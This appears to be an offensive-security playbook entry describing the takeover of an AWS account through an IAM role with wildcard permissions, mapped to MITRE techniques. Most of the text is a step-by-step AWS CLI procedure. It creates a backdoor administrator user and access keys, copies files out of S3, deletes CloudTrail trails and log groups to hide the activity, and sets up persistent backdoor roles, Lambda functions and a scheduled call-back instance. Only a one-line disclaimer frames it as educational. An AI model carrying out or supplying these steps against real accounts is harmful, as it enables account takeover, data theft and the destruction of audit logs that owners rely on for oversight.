- **MITRE**: T1068 – Exploitation for Privilege Escalation / T1078 – Valid Accounts Abuse
- **Impact**: Full compromise of AWS account, data exfiltration, persistence, log deletion, stealth attacks across services
- **Tools**: AWS CLI, IAM Policy Simulator (web), any browser
- **Scenario**: A cloud administrator accidentally assigns a wildcard (*) IAM permission in a role. This gives full access to all AWS actions and resources. An attacker with access to this IAM role can take over the entire AWS account by escalating privileges, deleting logs, spinning EC2 instances, creating users, and stealing sensitive data from services like S3, RDS, and Lambda.
- **Attack Steps**: STEP 1 – SETUP AND IDENTIFY IAM ROLE WITH WILDCARD PERMISSION: First, the attacker gets access to an IAM user or role that has a policy like this: "Action": "*", "Resource": "*" — this is often due to developer misconfiguration. You can verify your permissions using the AWS CLI: run aws iam get-user to confirm access. Then check policies: run aws iam list-attached-user-policies --user-name <YourUserName> and then aws iam get-policy-version --policy-arn <ARN> --version-id <version-id> to see if it includes "Action": "*" or "Resource": "*".STEP 2 – ENUMERATE YOUR CURRENT ACCESS SCOPE: Run aws iam list-roles, aws ec2 describe-instances, aws s3 ls, aws sts get-caller-identity. This helps you understand what permissions you currently have. Since wildcard is used, you'll likely see full access.STEP 3 – ESCALATE PRIVILEGES OR ABUSE: If you have "Action": "*", you can attach policies to other users or roles or even create new privileged users. For example:• Create new admin user: aws iam create-user --user-name hackeruser• Attach Admin Policy: aws iam attach-user-policy --user-name hackeruser --policy-arn arn:aws:iam::aws:policy/AdministratorAccess• Create credentials: aws iam create-access-key --user-name hackeruser → This gives full access.STEP 4 – EXPLOIT OTHER SERVICES USING WILDCARD:• S3: aws s3 ls → list buckets• aws s3 cp s3://bucket-name/secret.txt . → steal files• EC2: aws ec2 run-instances → launch your own EC2• Lambda: Modify functions to run malicious code• CloudTrail: aws cloudtrail delete-trail --name <trailname> → remove logsSTEP 5 – COVER TRACKS:• Delete logs: aws logs delete-log-group• Remove trails: aws cloudtrail delete-trail• Detach policies or delete users after abuseSTEP 6 – PERSISTENCE:• Create backdoor user/role with admin: aws iam create-role with "Action": "*"• Create Lambda function that can recreate access• Set up EC2 instance that connects to your server on a schedule (cron)STEP 7 – CLEAN EXIT (OPTIONAL):Remove all traces by deleting CloudTrail logs, user login history, or even deleting the role you abused. But beware: deleting too much may raise alarms.🚨 IMPORTANT NOTE: These steps are for educational and authorized environments only. Never perform these on real production systems without explicit permission.
